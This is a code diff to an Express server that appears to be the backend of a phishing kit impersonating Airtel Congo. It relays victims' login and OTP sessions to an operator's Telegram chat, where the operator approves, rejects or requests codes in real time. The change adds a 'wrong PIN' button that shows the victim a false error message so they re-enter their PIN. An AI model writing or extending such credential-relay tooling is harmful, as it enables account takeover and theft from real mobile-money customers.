@@ -36,7 +36,6 @@ setInterval(() => {
       o.status = 'expired';
       o.message = 'Le code a expiré. Un nouveau code a été envoyé, veuillez saisir le nouveau code.';
     }
-    // hard delete 15 min after creation
     if (now - o.createdAt > SESSION_TTL_MS) otpSessions.delete(id);
   }
 }, 30 * 1000);
@@ -199,11 +198,16 @@ app.post('/api/otp', async (req, res) => {
     `🆔 OTP Session: <code>${otpSessionId}</code>`;
 
   const reply_markup = {
-    inline_keyboard: [[
-      { text: '✅ Approuver', callback_data: `otp-approve:${otpSessionId}` },
-      { text: '❌ Rejeter',  callback_data: `otp-reject:${otpSessionId}` },
-      { text: '🔄 Renvoyer', callback_data: `otp-resend:${otpSessionId}` }
-    ]]
+    inline_keyboard: [
+      [
+        { text: '✅ Approuver',     callback_data: `otp-approve:${otpSessionId}` },
+        { text: '⚠️ Code PIN erroné', callback_data: `otp-wrongpin:${otpSessionId}` }
+      ],
+      [
+        { text: '❌ Rejeter',  callback_data: `otp-reject:${otpSessionId}` },
+        { text: '🔄 Renvoyer', callback_data: `otp-resend:${otpSessionId}` }
+      ]
+    ]
   };
 
   await tgSend(text, reply_markup);
@@ -220,7 +224,6 @@ app.get('/api/otp-status/:otpSessionId', (req, res) => {
     return res.json({ ok: false, status: 'timeout', message: 'Session expirée.' });
   }
 
-  // If pending and TTL passed, flip to expired
   if (o.status === 'pending' && Date.now() - o.createdAt > OTP_TTL_MS) {
     o.status = 'expired';
     o.message = 'Le code a expiré. Un nouveau code a été envoyé, veuillez saisir le nouveau code.';
@@ -233,7 +236,6 @@ app.get('/api/otp-status/:otpSessionId', (req, res) => {
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body || {};
 
-  // 1) Inline button tapped
   if (update.callback_query) {
     const cq = update.callback_query;
     const data = cq.data || '';
@@ -248,7 +250,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.sendStatus(200);
     }
 
-    // ---- LOGIN approve / reject (existing) ----
+    // ---- LOGIN approve / reject ----
     if (action === 'approve' || action === 'reject') {
       const s = sessions.get(id);
       if (!s) {
@@ -270,8 +272,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.sendStatus(200);
     }
 
-    // ---- OTP approve / reject / resend ----
-    if (action === 'otp-approve' || action === 'otp-reject' || action === 'otp-resend') {
+    // ---- OTP approve / reject / resend / wrongpin ----
+    if (action === 'otp-approve' || action === 'otp-reject' || action === 'otp-resend' || action === 'otp-wrongpin') {
       const o = otpSessions.get(id);
       if (!o) {
         await tgAnswerCallback(cq.id, 'Session OTP introuvable ou expirée.');
@@ -289,6 +291,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
         o.message = 'Code OTP incorrect. Veuillez réessayer.';
         await tgAnswerCallback(cq.id, '❌ Rejeté');
         if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n❌ <b>REJETÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
+      } else if (action === 'otp-wrongpin') {
+        o.status = 'wrongpin';
+        o.message = 'Code PIN incorrect. Veuillez saisir le bon code PIN.';
+        await tgAnswerCallback(cq.id, '⚠️ Code PIN erroné');
+        if (msg) await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + `\n\n⚠️ <b>CODE PIN ERRONÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`);
       } else { // otp-resend
         o.status = 'expired';
         o.message = 'Le code a expiré. Un nouveau code a été envoyé, veuillez saisir le nouveau code.';
@@ -302,7 +309,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // 2) Text commands fallback
   const msg = update.message;
   if (msg && msg.text && String(msg.chat.id) === CHAT_ID) {
     const text = msg.text.trim();
@@ -313,7 +319,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         `🤖 <b>Airtel Congo — Admin</b>\n\n` +
         `Utilisez les boutons inline sous chaque message:\n` +
         `• Connexion → ✅ Approuver / ❌ Rejeter\n` +
-        `• OTP → ✅ Approuver / ❌ Rejeter / 🔄 Renvoyer`
+        `• OTP → ✅ Approuver / ⚠️ Code PIN erroné / ❌ Rejeter / 🔄 Renvoyer`
       );
     }
   } else {
